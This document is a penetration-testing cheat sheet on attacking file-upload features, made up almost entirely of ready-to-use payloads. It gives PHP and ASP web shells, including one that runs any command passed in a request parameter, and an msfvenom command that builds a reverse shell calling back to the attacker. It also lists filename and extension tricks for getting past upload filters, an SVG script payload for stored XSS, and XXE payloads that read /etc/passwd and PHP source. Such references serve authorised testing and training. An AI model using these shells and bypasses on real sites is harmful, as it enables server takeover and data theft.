# File Upload

### Web Shells

| **Web Shell**                                                                           | **Description**                       |
| --------------------------------------------------------------------------------------- | ------------------------------------- |
| `<?php file_get_contents('/etc/passwd'); ?>`                                            | Basic PHP File Read                   |
| `<?php system('hostname'); ?>`                                                          | Basic PHP Command Execution           |
| `<?php system($_REQUEST['cmd']); ?>`                                                    | Basic PHP Web Shell                   |
| `<% eval request('cmd') %>`                                                             | Basic ASP Web Shell                   |
| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`          | Generate PHP reverse shell            |
| [PHP Web Shell](https://github.com/Arrexel/phpbash)                                     | PHP Web Shell                         |
| [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)                 | PHP Reverse Shell                     |
| [Web/Reverse Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) | List of Web Shells and Reverse Shells |

### Bypasses

| **Command**                                                                                                                                | **Description**                              |
| ------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------- |
| **Client-Side Bypass**                                                                                                                     |                                              |
| `[CTRL+SHIFT+C]`                                                                                                                           | Toggle Page Inspector                        |
| **Blacklist Bypass**                                                                                                                       |                                              |
| `shell.phtml`                                                                                                                              | Uncommon Extension                           |
| `shell.pHp`                                                                                                                                | Case Manipulation                            |
| [PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) | List of PHP Extensions                       |
| [ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)                | List of ASP Extensions                       |
| [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)                          | List of Web Extensions                       |
| **Whitelist Bypass**                                                                                                                       |                                              |
| `shell.jpg.php`                                                                                                                            | Double Extension                             |
| `shell.php.jpg`                                                                                                                            | Reverse Double Extension                     |
| `%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `…`                                                                                          | Character Injection - Before/After Extension |
| **Content/Type Bypass**                                                                                                                    |                                              |
| [Web Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)                             | List of Web Content-Types                    |
| [Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)                    | List of All Content-Types                    |
| [File Signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures)                                                                | List of File Signatures/Magic Bytes          |

### Limited Uploads

| **Potential Attack** | **File Types**          |
| -------------------- | ----------------------- |
| `XSS`                | HTML, JS, SVG, GIF      |
| `XXE`/`SSRF`         | XML, SVG, PDF, PPT, DOC |
| `DoS`                | ZIP, JPG, PNG           |

#### XSS

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

#### XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

Read source code in PHP web apps

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```
